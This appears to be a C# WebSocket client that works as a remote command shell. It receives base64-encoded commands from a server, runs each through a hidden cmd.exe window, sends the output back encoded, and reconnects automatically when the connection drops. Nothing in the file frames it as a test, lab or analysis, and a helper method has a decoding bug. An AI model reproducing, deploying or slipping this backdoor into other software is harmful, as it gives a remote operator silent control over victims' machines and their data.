using ICSharpCode.SharpZipLib.Zip.Compression.Streams;
using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using WebSocketSharp;

namespace websocket
{
    class WebSocketBase
    {
        private static StringBuilder sortOutput = null;
        Process sortProcess;
        string commands = null;
        private WebSocket webSocketClient = null;
        private WebSocketService webService = null;
        private Boolean isRecon = false;
        private string url = null;
        private System.Timers.Timer t = new System.Timers.Timer(2000);
        public WebSocketBase(string url, WebSocketService webService)
        {
            this.webService = webService;
            this.url = url;
        }
        public void start()
        {
            webSocketClient = new WebSocket(url);
            webSocketClient.OnError += new EventHandler<WebSocketSharp.ErrorEventArgs>(webSocketClient_Error);
            webSocketClient.OnOpen += new EventHandler(webSocketClient_Opened);
            webSocketClient.OnClose += new EventHandler<WebSocketSharp.CloseEventArgs>(webSocketClient_Closed);
            webSocketClient.OnMessage += new EventHandler<MessageEventArgs>(webSocketClient_MessageReceived);
            webSocketClient.ConnectAsync();
            while (!webSocketClient.IsAlive)
            {
                Console.WriteLine("Waiting WebSocket connnet......");
                Thread.Sleep(1000);
            }
            t.Elapsed += new System.Timers.ElapsedEventHandler(heatBeat);
            t.Start();

        }

        private void heatBeat(object sender, System.Timers.ElapsedEventArgs e)
        {

            // this.send("{\"type\":\"ping1\"}");
        }
        private void webSocketClient_Error(object sender, WebSocketSharp.ErrorEventArgs e)
        {

        }
        private void webSocketClient_MessageReceived(object sender, MessageEventArgs e)
        {


            var ControlWay = Midstr(e.Data, "\"type\":\"", "\"");

            if (ControlWay == "ping")
            {
                this.send("{\"type\":\"ping\"}");
            }
            else if (ControlWay == "say")
            {
                Base64Tools base64Tools = new Base64Tools();
                var EncodeCmd = Midstr(e.Data, "\"content\":\"", "\"}");
                commands = base64Tools.base64decode(EncodeCmd);
                SortInputListText();
            }
            // webService.onReceive(e.Data);
        }
        private void SortOutputHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            if (!String.IsNullOrEmpty(outLine.Data))
            {
                Base64Tools base64Tools = new Base64Tools();
                string ResponseCmd = "<span>" + outLine.Data + Environment.NewLine + "<br><span>";
                this.send("{\"type\":\"say\",\"content\":\"" + base64Tools.base64encode(ResponseCmd) + "\"}");
            }
        }
        public void SortInputListText()
        {
            if (sortProcess != null)
            {
                sortProcess.Close();
            }
            sortProcess = new Process();
            sortOutput = new StringBuilder("");
            sortProcess.StartInfo.FileName = "cmd.exe";
            sortProcess.StartInfo.UseShellExecute = false;// 必须禁用操作系统外壳程序  
            sortProcess.StartInfo.RedirectStandardOutput = true;
            sortProcess.StartInfo.RedirectStandardError = true; //重定向错误输出
            sortProcess.StartInfo.CreateNoWindow = true;  //设置不显示窗口
            sortProcess.StartInfo.RedirectStandardInput = true;
            sortProcess.StartInfo.Arguments = "/c " + commands;    //设定程式执行参数
            sortProcess.Start();
            sortProcess.BeginOutputReadLine();// 异步获取命令行内容  
            sortProcess.OutputDataReceived += new DataReceivedEventHandler(SortOutputHandler); // 为异步获取订阅事件  
        }

        public static string Midstr(string sourse, string s, string e)
        {
            Regex rg = new Regex("(?<=(" + s + "))[.\\s\\S]*?(?=(" + e + "))", RegexOptions.Multiline | RegexOptions.Singleline);
            return rg.Match(sourse).Value;
        }
        private void webSocketClient_Closed(object sender, WebSocketSharp.CloseEventArgs e)
        {
            if (!webSocketClient.IsAlive)
            {
                isRecon = true;
                webSocketClient.ConnectAsync();
            }
        }
        public string Decompress(byte[] baseBytes)
        {
            string resultStr = string.Empty;
            using (MemoryStream memoryStream = new MemoryStream(baseBytes))
            {
                using (InflaterInputStream inf = new InflaterInputStream(memoryStream))
                {
                    using (MemoryStream buffer = new MemoryStream())
                    {
                        byte[] result = new byte[1024];

                        int resLen;
                        while ((resLen = inf.Read(result, 0, result.Length)) > 0)
                        {
                            buffer.Write(result, 0, resLen);
                        }
                        resultStr = Encoding.Default.GetString(result);
                    }
                }
            }
            return resultStr;
        }
        private void webSocketClient_Opened(object sender, EventArgs e)
        {
            //  this.send("{'event':'ping2'}");
        }

        public Boolean isReconnect()
        {
            if (isRecon)
            {
                if (webSocketClient.IsAlive)
                {
                    isRecon = false;
                }
                return true;
            }
            return false;
        }
        public void send(string channle)
        {
            webSocketClient.Send(channle);
        }
        public void stop()
        {
            if (webSocketClient != null)
                webSocketClient.Close();
        }

    }
    interface WebSocketService
    {
        void onReceive(String msg);
    }
}
